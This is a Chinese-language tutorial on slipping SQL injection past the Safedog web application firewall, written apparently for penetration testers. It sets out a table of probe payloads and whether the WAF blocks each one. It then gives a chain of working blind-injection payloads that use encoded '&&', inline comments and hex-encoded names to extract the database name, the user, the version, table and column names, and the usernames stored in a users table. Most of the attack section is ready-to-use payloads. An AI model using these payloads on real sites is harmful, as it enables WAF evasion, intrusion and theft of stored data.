# sql注入绕狗安全狗

## 0x01概述

在做渗透测试的时候经常会遇到安全狗防护，为了更好的做渗透所以好好研究了以下如何绕过安全狗进行sql注入。

## 常见的绕狗方法

- 注释符号绕过
- 替换关键字绕过
- 大小写绕过
- 双写关键字绕过
- 特殊编码绕过
- 空格过滤绕过
- 替换or and 绕过
- 等等

## 分析安全狗过滤的关键字

分析安全狗过滤的关键字和特殊符号用于判断那些关键字和特殊符号可以用来绕过安全狗。


| payload        | 结果    |
| --------   | -----:  |
| '        | 数据库报错，不拦截     |
| ' and 1=1–+       | 拦截      |
| ' sss 1=1        | 不拦截     |
| ' %26%261–+       | 拦截     |
| %26%26 True      | 不拦截     |
| 'xor 1–+     | 不拦截     |
| '|| 1     | 拦截     |
| /*!order*//*!baaaaa*/1--+ | 不拦截     |
————————————————
等等

## 绕狗注入

经过上面的分析，我们可以看出，有很多关键字和特使符合没有被拦截，我们可以组合一下。

使用 '%26%26 (length(database/**/())=8)--+ 获取数据名的长度。


使用 '%26%26 (length(USER/**/())=14)--+ 获取数据库名的长度。


还有获取版本信息：' %26%26 (ascii(@@version)=53)--+

获取数据库的表数量,这里有俩点需要注意

1. count() 这个函数需要在()中掺杂一些注释用于绕过
2. 数据库名转换为16进制

' %26%26 (0<(select count(/*!table_name*/) from information_schema.tables where table_schema=0x7365637572697479))--+


获取数据库的表名

' %26%26 (0< ascii(substr((select group_concat(/*!table_name*/) from information_schema.tables where table_schema=0x7365637572697479),1,1))) --+


获取数据库的字段，注意&&用%26%26

' %26%26 (0<ascii(substr((select group_concat(/*!column_name*/) from information_schema.columns  where table_schema=0x7365637572697479 %26%26 table_name=0x7573657273),1,1))) --+


获取数据

' %26%26 (0<ascii(substr((SELECT group_concat(/*!username*/) FROM `security`.`users`),1,1))) --+


## 总结

绕狗的方法有很多，这是最基础的，就是用这么注释，编码来感染匹配规则，让他们检测不到，就达到了绕过。
